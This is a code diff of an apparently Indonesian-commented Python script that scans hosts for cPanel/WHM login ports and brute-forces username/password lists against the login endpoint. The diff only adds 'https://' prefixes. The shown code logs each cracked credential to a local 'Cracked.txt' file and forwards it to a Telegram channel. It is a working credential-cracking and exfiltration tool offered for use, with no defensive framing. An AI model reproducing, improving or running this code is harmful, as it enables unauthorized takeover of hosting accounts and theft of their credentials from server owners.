@@ -55,7 +55,7 @@ def cw(url):
         session = requests.Session()
 
         for port in p:
-            uwp = f'{url}:{port}'
+            uwp = f'https://{url}:{port}'
             response = session.get(uwp, headers=headers, verify=False)
             if response.status_code == 200:
                 print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[cPanel Found!] - {FW}{uwp}")
@@ -72,7 +72,7 @@ def c(url, username, password):
     ep = "/login/?login_only=1"
 
     for port in ports:
-        uwp = f'{url}:{port}{ep}'
+        uwp = f'https://{url}:{port}{ep}'
 
         payload = {
             "user": username,
@@ -83,8 +83,8 @@ def c(url, username, password):
         headers = {
             'Content-type': 'application/x-www-form-urlencoded',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-            'Origin': f'{url}:{port}',
-            'Referer': f'{url}:{port}/',
+            'Origin': f'https://{url}:{port}',
+            'Referer': f'https://{url}:{port}/',
             'Connection': 'keep-alive'
         }
 
@@ -94,22 +94,22 @@ def c(url, username, password):
 
             # Cek jika login sukses
             if response.status_code == 200 and '"status":1' in response.text:
-                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}{url}:{port} - {FC}{username}|{password}")
+                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
                 
                 # Format pesan untuk Telegram
-                success_message = f"{url}:{port}cpanel|{username}|{password}"
+                success_message = f"https://{url}:{port}cpanel|{username}|{password}"
                 
                 # Kirim ke file Cracked.txt
                 with open("Results/Cracked.txt", "a") as f:
-                    f.write(f"[+] URLs: {url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
+                    f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
                 
                 # Kirim pesan ke Telegram
                 send_telegram_message(success_message)
             else:
-                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}{url}:{port} - {FC}{username}|{password}")
+                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
 
         except requests.exceptions.RequestException as e:
-            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}{url}:{port} - {FC}{username}|{password}")
+            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
 
 def process_line(url, usernames, passwords):
     for username in usernames:
